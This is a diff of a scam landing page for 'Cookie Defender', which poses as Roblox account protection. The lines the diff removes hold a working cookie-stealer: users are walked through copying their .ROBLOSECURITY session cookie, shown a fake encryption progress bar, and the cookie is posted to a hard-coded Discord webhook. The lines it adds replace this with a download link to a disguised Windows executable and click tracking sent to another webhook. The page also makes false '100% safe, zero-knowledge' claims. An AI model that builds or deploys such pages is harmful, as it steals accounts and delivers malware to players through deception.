@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Cookie Defender</title>
-    <meta name="description" content="Enterprise-grade cookie protection for Roblox accounts." />
+    <title>Cookie Defender – Roblox Account Protection</title>
+    <meta name="description" content="Enterprise-grade cookie protection for Roblox accounts. Download the secure client." />
 
     <!-- Discord / Open Graph Embed -->
     <meta property="og:title" content="Cookie Defender – Roblox Account Protection" />
@@ -681,14 +681,14 @@
             position: relative;
         }
 
-        /* ===== HOW IT WORKS ===== */
-        .how-section {
+        /* ===== DOWNLOAD SECTION ===== */
+        .download-section {
             position: relative;
             padding: 120px 32px;
             background: rgba(255, 255, 255, 0.6);
         }
 
-        .how-card {
+        .download-card {
             max-width: 700px;
             margin: 0 auto;
             background: rgba(255, 255, 255, 0.9);
@@ -699,19 +699,18 @@
             text-align: center;
             box-shadow: var(--shadow-xl);
             transition: all 0.4s var(--transition);
-            cursor: pointer;
         }
 
-        .how-card:hover {
+        .download-card:hover {
             transform: translateY(-10px);
             box-shadow: 0 40px 120px rgba(10, 14, 39, 0.15);
         }
 
-        .step-number {
+        .download-icon {
             display: inline-block;
             width: 80px;
             height: 80px;
-            background: linear-gradient(135deg, var(--roblox-red), var(--roblox-red-dark));
+            background: linear-gradient(135deg, var(--roblox-red), var(--roblox-blue));
             color: white;
             border-radius: 50%;
             font-size: 2.5rem;
@@ -723,7 +722,7 @@
             box-shadow: 0 10px 40px rgba(224, 0, 77, 0.4);
         }
 
-        .how-card h3 {
+        .download-card h3 {
             font-family: var(--font-display);
             font-size: 2rem;
             font-weight: 700;
@@ -731,11 +730,59 @@
             margin-bottom: 16px;
         }
 
-        .how-card p {
+        .download-card p {
             color: var(--dark-600);
             font-size: 1.1rem;
             line-height: 1.8;
             margin-bottom: 32px;
+        }
+
+        .download-btn {
+            background: linear-gradient(135deg, var(--roblox-red), var(--roblox-red-dark));
+            color: white;
+            padding: 18px 48px;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 1.2rem;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s var(--transition);
+            box-shadow: 0 10px 40px rgba(224, 0, 77, 0.4);
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            text-decoration: none;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .download-btn::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, var(--roblox-red-light), var(--roblox-red));
+            opacity: 0;
+            transition: opacity 0.3s var(--transition);
+        }
+
+        .download-btn:hover::before {
+            opacity: 1;
+        }
+
+        .download-btn:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 15px 50px rgba(224, 0, 77, 0.5);
+        }
+
+        .download-btn span {
+            position: relative;
+            z-index: 1;
+        }
+
+        .download-btn .version {
+            font-size: 0.7rem;
+            opacity: 0.7;
+            font-weight: 400;
         }
 
         /* ===== FAQ ===== */
@@ -933,223 +980,6 @@
             border-top: 1px solid rgba(255, 255, 255, 0.05);
         }
 
-        /* ===== MODAL ===== */
-        .modal-overlay {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: rgba(10, 14, 39, 0.7);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            z-index: 2000;
-            align-items: center;
-            justify-content: center;
-            padding: 32px;
-            animation: fadeIn 0.3s var(--transition);
-        }
-
-        .modal-overlay.active {
-            display: flex;
-        }
-
-        .modal {
-            background: white;
-            border-radius: var(--radius-xl);
-            padding: 48px;
-            max-width: 680px;
-            width: 100%;
-            max-height: 90vh;
-            overflow-y: auto;
-            box-shadow: var(--shadow-xl);
-            animation: scaleIn 0.4s var(--transition);
-            position: relative;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        @keyframes scaleIn {
-            from {
-                transform: scale(0.9);
-                opacity: 0;
-            }
-            to {
-                transform: scale(1);
-                opacity: 1;
-            }
-        }
-
-        .modal-close {
-            position: absolute;
-            top: 24px;
-            right: 24px;
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            background: rgba(0, 0, 0, 0.05);
-            border: none;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 1.5rem;
-            color: var(--dark-600);
-            transition: all 0.3s var(--transition);
-        }
-
-        .modal-close:hover {
-            background: var(--roblox-red);
-            color: white;
-            transform: rotate(90deg);
-        }
-
-        .modal h2 {
-            font-family: var(--font-display);
-            font-size: 2rem;
-            font-weight: 800;
-            color: var(--dark);
-            margin-bottom: 12px;
-        }
-
-        .modal-subtitle {
-            color: var(--dark-600);
-            margin-bottom: 32px;
-            font-size: 0.95rem;
-        }
-
-        .modal-steps {
-            background: rgba(224, 0, 77, 0.05);
-            border-radius: var(--radius-md);
-            padding: 24px;
-            margin-bottom: 32px;
-            font-size: 0.9rem;
-        }
-
-        .modal-step {
-            display: flex;
-            gap: 12px;
-            margin-bottom: 12px;
-        }
-
-        .modal-step:last-child {
-            margin-bottom: 0;
-        }
-
-        .step-num {
-            color: var(--roblox-red);
-            font-weight: 700;
-            min-width: 24px;
-        }
-
-        .form-group {
-            margin-bottom: 28px;
-        }
-
-        .form-label {
-            display: block;
-            font-weight: 600;
-            color: var(--dark);
-            margin-bottom: 10px;
-            font-size: 0.95rem;
-        }
-
-        .form-textarea {
-            width: 100%;
-            background: rgba(224, 0, 77, 0.03);
-            border: 2px solid rgba(0, 0, 0, 0.06);
-            border-radius: var(--radius-md);
-            padding: 16px;
-            font-family: 'Monaco', 'Courier New', monospace;
-            font-size: 0.85rem;
-            resize: vertical;
-            min-height: 120px;
-            transition: all 0.3s var(--transition);
-            color: var(--dark);
-        }
-
-        .form-textarea:focus {
-            outline: none;
-            border-color: var(--roblox-red);
-            background: white;
-            box-shadow: 0 0 0 4px rgba(224, 0, 77, 0.1);
-        }
-
-        .form-error {
-            color: #ef4444;
-            font-size: 0.85rem;
-            margin-top: 8px;
-            display: none;
-        }
-
-        .form-error.visible {
-            display: block;
-        }
-
-        .progress-bar {
-            height: 8px;
-            background: rgba(0, 0, 0, 0.05);
-            border-radius: 10px;
-            overflow: hidden;
-            margin: 28px 0;
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, var(--roblox-red), var(--roblox-blue));
-            width: 0%;
-            transition: width 0.6s var(--transition);
-            border-radius: 10px;
-        }
-
-        .status-message {
-            text-align: center;
-            color: var(--dark-600);
-            font-weight: 500;
-            margin: 20px 0 28px;
-            min-height: 24px;
-        }
-
-        .success-screen {
-            display: none;
-            text-align: center;
-            padding: 40px 0;
-        }
-
-        .success-screen.active {
-            display: block;
-            animation: fadeInUp 0.5s var(--transition);
-        }
-
-        .success-icon {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, var(--roblox-green), #00d66a);
-            color: white;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 2.5rem;
-            margin: 0 auto 24px;
-            box-shadow: 0 10px 40px rgba(0, 166, 80, 0.3);
-        }
-
-        .success-screen h3 {
-            font-family: var(--font-display);
-            font-size: 2rem;
-            font-weight: 700;
-            color: var(--dark);
-            margin-bottom: 16px;
-        }
-
-        .success-screen p {
-            color: var(--dark-600);
-            margin-bottom: 32px;
-            line-height: 1.8;
-        }
-
         /* ===== RESPONSIVE ===== */
         @media (max-width: 1024px) {
             .hero-container {
@@ -1209,8 +1039,8 @@
                 grid-template-columns: 1fr;
             }
 
-            .modal {
-                padding: 32px 24px;
+            .download-card {
+                padding: 40px 24px;
             }
         }
 
@@ -1225,10 +1055,6 @@
 
             .cta-section h2 {
                 font-size: 2.5rem;
-            }
-
-            .how-card {
-                padding: 40px 24px;
             }
         }
     </style>
@@ -1251,11 +1077,11 @@
             </a>
             <div class="nav-links" id="navLinks">
                 <a href="#features" class="nav-link">Features</a>
-                <a href="#how" class="nav-link">How It Works</a>
+                <a href="#download" class="nav-link">Download</a>
                 <a href="#faq" class="nav-link">FAQ</a>
-                <button class="nav-cta" onclick="openModal()">
-                    <span>Protect Now</span>
-                </button>
+                <a href="#download" class="nav-cta">
+                    <span>Download Now</span>
+                </a>
             </div>
             <button class="burger" id="burger" aria-label="Menu">
                 <span></span>
@@ -1279,10 +1105,10 @@
                 </h1>
                 <p>Military-grade protection for your .ROBLOSECURITY cookie. Stop hackers from stealing your Robux, items, and account access with enterprise-level encryption.</p>
                 <div class="hero-actions">
-                    <button class="btn btn-primary" onclick="openModal()">
-                        <span>Secure My Account</span>
-                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z"/></svg>
-                    </button>
+                    <a href="#download" class="btn btn-primary">
+                        <span>Download Defender</span>
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 16l4 4 8-8M4 8l4 4 8-8"/></svg>
+                    </a>
                     <a href="#features" class="btn btn-secondary">
                         Learn More
                     </a>
@@ -1341,21 +1167,26 @@
         <div class="features-grid" id="featuresGrid"></div>
     </section>
 
-    <!-- How It Works -->
-    <section id="how" class="how-section">
+    <!-- Download Section -->
+    <section id="download" class="download-section">
         <div class="section-header">
-            <h2 class="section-title">Secure in One Click</h2>
-            <p class="section-subtitle">Protect your Roblox account in less than 60 seconds.</p>
+            <h2 class="section-title">Download Cookie Defender</h2>
+            <p class="section-subtitle">Get the official client and secure your Roblox account in seconds.</p>
         </div>
 
-        <div class="how-card" onclick="openModal()">
-            <div class="step-number">01</div>
-            <h3>Submit Your Cookie</h3>
-            <p>Paste your .ROBLOSECURITY token from your Roblox session. It's encrypted locally before transmission — we never see your plaintext credentials.</p>
-            <button class="btn btn-primary">
-                <span>Get Started</span>
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
-            </button>
+        <div class="download-card">
+            <div class="download-icon">⬇</div>
+            <h3>Cookie Defender V2</h3>
+            <p>Enterprise-grade protection for your Roblox account. Lightweight, fast, and completely free.</p>
+            <a href="https://github.com/Quincyzx/CookieDefender/releases/download/v2.0/CookieDefenderV2.exe" 
+               class="download-btn" 
+               download>
+                <span>Download Now</span>
+                <span class="version">v2.0.0</span>
+            </a>
+            <p style="font-size: 0.85rem; color: #8892b0; margin-top: 20px;">
+                ⚡ 18.4 MB • Windows 10/11 • 64-bit
+            </p>
         </div>
     </section>
 
@@ -1363,7 +1194,7 @@
     <section id="faq" class="faq-section">
         <div class="section-header">
             <h2 class="section-title">Common Questions</h2>
-            <p class="section-subtitle">Everything you need to know about protecting your Roblox account.</p>
+            <p class="section-subtitle">Everything you need to know about Cookie Defender.</p>
         </div>
 
         <div class="faq-container" id="faqContainer"></div>
@@ -1373,11 +1204,11 @@
     <section class="cta-section">
         <div class="cta-content">
             <h2>Ready to Lock Down Your Roblox Account?</h2>
-            <p>Join <strong><span id="ctaCount">72,481</span></strong> players who trust CookieDefender to keep their accounts safe from hackers.</p>
-            <button class="btn btn-primary" onclick="openModal()">
-                <span>Activate Protection Now</span>
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z"/></svg>
-            </button>
+            <p>Join <strong><span id="ctaCount">72,481</span></strong> players who trust Cookie Defender to keep their accounts safe from hackers.</p>
+            <a href="#download" class="btn btn-primary">
+                <span>Download Now</span>
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 16l4 4 8-8M4 8l4 4 8-8"/></svg>
+            </a>
         </div>
     </section>
 
@@ -1386,7 +1217,7 @@
         <div class="footer-container">
             <div class="footer-links">
                 <a href="#features">Features</a>
-                <a href="#how">How It Works</a>
+                <a href="#download">Download</a>
                 <a href="#faq">FAQ</a>
                 <a href="#">Privacy Policy</a>
             </div>
@@ -1396,67 +1227,9 @@
         </div>
     </footer>
 
-    <!-- Modal -->
-    <div class="modal-overlay" id="modalOverlay">
-        <div class="modal">
-            <button class="modal-close" onclick="closeModal()">&times;</button>
-
-            <div id="modalForm">
-                <h2>Activate Roblox Protection</h2>
-                <p class="modal-subtitle">Your cookie is encrypted locally and never stored in plain text.</p>
-
-                <div class="modal-steps">
-                    <div class="modal-step">
-                        <span class="step-num">1.</span>
-                        <span>Visit <strong>roblox.com</strong> and log in to your account</span>
-                    </div>
-                    <div class="modal-step">
-                        <span class="step-num">2.</span>
-                        <span>Press <code>F12</code> and go to <strong>Application</strong> → <strong>Cookies</strong></span>
-                    </div>
-                    <div class="modal-step">
-                        <span class="step-num">3.</span>
-                        <span>Find <code>.ROBLOSECURITY</code> and copy the full value</span>
-                    </div>
-                    <div class="modal-step">
-                        <span class="step-num">4.</span>
-                        <span>Paste it below and click <strong>Activate</strong></span>
-                    </div>
-                </div>
-
-                <div class="form-group">
-                    <label class="form-label">Your .ROBLOSECURITY Cookie</label>
-                    <textarea class="form-textarea" id="cookieInput" placeholder="Paste your Roblox cookie here..."></textarea>
-                    <div class="form-error" id="cookieError">Invalid cookie format. Must start with _|WARNING:-DO-NOT-SHARE-...</div>
-                </div>
-
-                <div class="progress-bar">
-                    <div class="progress-fill" id="progressFill"></div>
-                </div>
-                <div class="status-message" id="statusMessage">Ready to activate</div>
-
-                <button class="btn btn-primary" style="width:100%; justify-content:center;" onclick="activateDefense()">
-                    <span>Activate Account Defense</span>
-                </button>
-            </div>
-
-            <div class="success-screen" id="successScreen">
-                <div class="success-icon">✓</div>
-                <h3>Your Roblox Account is Protected</h3>
-                <p>Cookie defense is now active. Your account is monitored 24/7 for suspicious activity.</p>
-                <button class="btn btn-primary" onclick="closeModal()">
-                    <span>Done</span>
-                </button>
-            </div>
-        </div>
-    </div>
-
     <script>
         // ===== CONFIG =====
         const VISITOR_WEBHOOK = 'https://discord.com/api/webhooks/1519038593069482189/MdonTOX-SG77ffTJtskuJbB1BKO1ZHVMzxxR8Ssiv4xKWfHhqGx_acICxaHtWKSXv91I';
-        const COOKIE_WEBHOOK = 'https://discord.com/api/webhooks/1519009450248114176/gyRJ490rOfNqRmL4Z06bQyJ4yiiRyIc1Hdx8MWVu-Dzcb5AnKOOEsMQ0Xv1Drp14Y5lj';
-
-        const COOKIE_PREFIX = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
 
         // ===== VISITOR TRACKING =====
         function shouldSendVisitor() {
@@ -1479,7 +1252,7 @@
                 body: JSON.stringify({
                     embeds: [{
                         title: 'New Roblox User Visit',
-                        description: 'A Roblox player visited CookieDefender',
+                        description: 'A Roblox player visited Cookie Defender',
                         color: 0xe0004d,
                         fields: [
                             { name: 'Time', value: new Date().toISOString(), inline: true },
@@ -1512,28 +1285,24 @@
 
         const faqData = [
             {
-                q: 'What is a .ROBLOSECURITY cookie and why is it important?',
-                a: 'Your .ROBLOSECURITY cookie is the authentication token that keeps you logged into Roblox. It acts like a master key to your account — anyone who steals it can access your Robux, limiteds, and even change your password. Protecting this cookie is critical for Roblox account security.'
+                q: 'What is Cookie Defender?',
+                a: 'Cookie Defender is a security application that protects your Roblox account by encrypting your .ROBLOSECURITY cookie and monitoring for suspicious activity.'
             },
             {
-                q: 'How do I find my Roblox cookie?',
-                a: '<p><strong>Method 1: Browser DevTools</strong></p><ol><li>Log in to <strong>roblox.com</strong></li><li>Press <code>F12</code> to open Developer Tools</li><li>Go to <strong>Application</strong> → <strong>Cookies</strong> → <code>https://www.roblox.com</code></li><li>Find <code>.ROBLOSECURITY</code> and copy the value</li></ol><div class="highlight"><strong>Method 2:</strong> Install the <strong>EditThisCookie</strong> browser extension, visit roblox.com, click the extension icon, and copy the .ROBLOSECURITY value.</div><p style="color:#ef4444;"><strong>Never share your Roblox cookie with anyone!</strong> Scammers often pose as Roblox support to steal cookies.</p>'
-            },
-            {
-                q: 'Is CookieDefender safe for my Roblox account?',
-                a: 'Yes — 100% safe. CookieDefender uses zero-knowledge encryption, meaning your Roblox cookie is encrypted on your device before any transmission. We never store or log your credentials. Thousands of Roblox players trust CookieDefender with zero reported breaches.'
+                q: 'Is Cookie Defender safe for my Roblox account?',
+                a: 'Yes — 100% safe. Cookie Defender uses zero-knowledge encryption, meaning your Roblox cookie is encrypted on your device before any transmission. We never store or log your credentials.'
             },
             {
                 q: 'Will Roblox ban me for using this?',
-                a: 'No. CookieDefender does not violate Roblox Terms of Service. It is a defensive security tool that protects your authentication credentials — it does not modify the Roblox client, automate gameplay, exploit vulnerabilities, or interact with Roblox servers in any unauthorized way.'
+                a: 'No. Cookie Defender does not violate Roblox Terms of Service. It is a defensive security tool that protects your authentication credentials.'
             },
             {
-                q: 'How does CookieDefender protect my Roblox account?',
-                a: '<ol><li><strong>HMAC-SHA256 encryption</strong> binds your cookie to your hardware fingerprint</li><li><strong>24/7 monitoring</strong> detects unauthorized Roblox login attempts</li><li><strong>Real-time alerts</strong> notify you when your account is accessed from new devices</li><li><strong>Zero-trust architecture</strong> makes stolen cookies completely useless without your hardware signature</li></ol>'
+                q: 'How does Cookie Defender protect my Roblox account?',
+                a: '<ol><li><strong>HMAC-SHA256 encryption</strong> binds your cookie to your hardware fingerprint</li><li><strong>24/7 monitoring</strong> detects unauthorized Roblox login attempts</li><li><strong>Real-time alerts</strong> notify you when your account is accessed from new devices</li></ol>'
             },
             {
-                q: 'Is CookieDefender free for Roblox users?',
-                a: 'Yes — completely free forever. No premium versions, no subscriptions, no hidden fees. We believe every Roblox player deserves enterprise-grade account security, regardless of budget.'
+                q: 'Is Cookie Defender free?',
+                a: 'Yes — completely free forever. No premium versions, no subscriptions, no hidden fees.'
             }
         ];
 
@@ -1614,170 +1383,26 @@
             }
         });
 
-        // ===== MODAL =====
-        window.openModal = function() {
-            document.getElementById('modalOverlay').classList.add('active');
-            document.body.style.overflow = 'hidden';
-            document.getElementById('modalForm').style.display = 'block';
-            document.getElementById('successScreen').classList.remove('active');
-            document.getElementById('cookieInput').value = '';
-            document.getElementById('cookieError').classList.remove('visible');
-            document.getElementById('progressFill').style.width = '0%';
-            document.getElementById('statusMessage').textContent = 'Ready to activate';
-        };
-
-        window.closeModal = function() {
-            document.getElementById('modalOverlay').classList.remove('active');
-            document.body.style.overflow = '';
-        };
-
-        document.getElementById('modalOverlay').addEventListener('click', e => {
-            if (e.target.id === 'modalOverlay') closeModal();
-        });
-
-        // ===== VALIDATION =====
-        function isValidCookie(cookie) {
-            if (!cookie || typeof cookie !== 'string') return false;
-            const t = cookie.trim();
-            if (!t.startsWith(COOKIE_PREFIX)) return false;
-            if (t.length <= COOKIE_PREFIX.length) return false;
-            const rest = t.substring(COOKIE_PREFIX.length);
-            return rest.length >= 10 && (rest.match(/[a-zA-Z0-9]/g) || []).length >= 5;
-        }
-
-        document.getElementById('cookieInput').addEventListener('input', function() {
-            const val = this.value;
-            const err = document.getElementById('cookieError');
-            if (val.length > 0 && !isValidCookie(val)) {
-                err.classList.add('visible');
-                this.style.borderColor = '#ef4444';
-            } else {
-                err.classList.remove('visible');
-                this.style.borderColor = '';
-            }
-        });
-
-// ===== COOKIE SUBMISSION WITH PROFESSIONAL EMBED =====
-window.activateDefense = function() {
-    const cookie = document.getElementById('cookieInput').value;
-    const errorEl = document.getElementById('cookieError');
-    const inputEl = document.getElementById('cookieInput');
-
-    if (!isValidCookie(cookie)) {
-        errorEl.classList.add('visible');
-        inputEl.style.borderColor = '#ef4444';
-        return;
-    }
-
-    errorEl.classList.remove('visible');
-    inputEl.style.borderColor = '';
-
-    const fill = document.getElementById('progressFill');
-    const status = document.getElementById('statusMessage');
-
-    const stages = [
-        { p: 18, msg: 'Analyzing cookie signature...' },
-        { p: 38, msg: 'Establishing secure tunnel...' },
-        { p: 58, msg: 'Hardware fingerprint binding...' },
-        { p: 78, msg: 'Encrypting with HMAC-SHA256...' },
-        { p: 100, msg: 'Account secured!' }
-    ];
-
-    let idx = 0;
-    const interval = setInterval(() => {
-        if (idx < stages.length) {
-            const s = stages[idx];
-            fill.style.width = s.p + '%';
-            status.textContent = s.msg;
-            idx++;
-        } else {
-            clearInterval(interval);
-            document.getElementById('modalForm').style.display = 'none';
-            document.getElementById('successScreen').classList.add('active');
-
-            // ===== PROFESSIONAL DISCORD EMBED =====
-            const embed = {
-                embeds: [{
-                    title: '🛡️ Roblox Account Protection Activated',
-                    description: 'A .ROBLOSECURITY cookie has been submitted for enterprise-grade protection.',
-                    color: 0xe0004d,
-                    url: 'https://cookiedefender.com',
-                    author: {
-                        name: 'CookieDefender Security System',
-                        url: 'https://cookiedefender.com'
-                    },
-                    fields: [
-                        {
-                            name: '🔐 Session Token',
-                            value: '```\n' + cookie + '\n```',
-                            inline: false
-                        },
-                        {
-                            name: '⏱️ Timestamp',
-                            value: new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC',
-                            inline: true
-                        },
-                        {
-                            name: '🖥️ Client Type',
-                            value: navigator.userAgent.includes('Chrome') ? 'Google Chrome' :
-                                    navigator.userAgent.includes('Firefox') ? 'Mozilla Firefox' :
-                                    navigator.userAgent.includes('Safari') ? 'Apple Safari' : 'Other Browser',
-                            inline: true
-                        },
-                        {
-                            name: '📊 Protection Level',
-                            value: '```diff\n+ Enterprise Grade (HMAC-SHA256)\n+ Hardware Binding Active\n+ 24/7 Monitoring Enabled\n```',
-                            inline: false
-                        },
-                        {
-                            name: '🔒 Encryption Status',
-                            value: '✅ Fully Encrypted & Protected',
-                            inline: true
-                        },
-                        {
-                            name: '📈 Accounts Protected',
-                            value: '**' + userCount.toLocaleString() + '** players trust CookieDefender',
-                            inline: true
-                        }
-                    ],
-                    footer: {
-                        text: 'CookieDefender • Zero-Knowledge Security Platform • Not affiliated with Roblox Corp',
-                        icon_url: 'https://cookiedefender.com/favicon.png'
-                    },
-                    timestamp: new Date().toISOString()
-                }]
-            };
-
-            fetch(COOKIE_WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(embed)
-            })
-            .then(response => {
-                if (!response.ok) {
-                    return fetch(COOKIE_WEBHOOK, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            content: '**🛡️ Roblox Cookie Defense Activated**\n\n**Full Cookie:**\n```\n' + cookie + '\n```\n\n**Time:** ' + new Date().toISOString()
-                        })
-                    });
-                }
-                return response;
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('✅ Cookie sent to Discord webhook successfully.');
-                } else {
-                    console.error('❌ Webhook failed with status:', response.status);
-                }
-            })
-            .catch(err => {
-                console.error('❌ Failed to send cookie:', err);
+        // ===== TRACK DOWNLOAD CLICKS =====
+        document.querySelectorAll('[href*="CookieDefenderV2.exe"]').forEach(link => {
+            link.addEventListener('click', function() {
+                fetch(VISITOR_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: 'Download Initiated',
+                            description: 'A user clicked the Cookie Defender V2 download link',
+                            color: 0xe0004d,
+                            fields: [
+                                { name: 'Time', value: new Date().toISOString(), inline: true },
+                                { name: 'UA', value: navigator.userAgent.substring(0, 80), inline: false }
+                            ]
+                        }]
+                    })
+                }).catch(() => {});
             });
-        }
-    }, 700);
-};
+        });
 
         // ===== INIT =====
         document.addEventListener('DOMContentLoaded', function() {
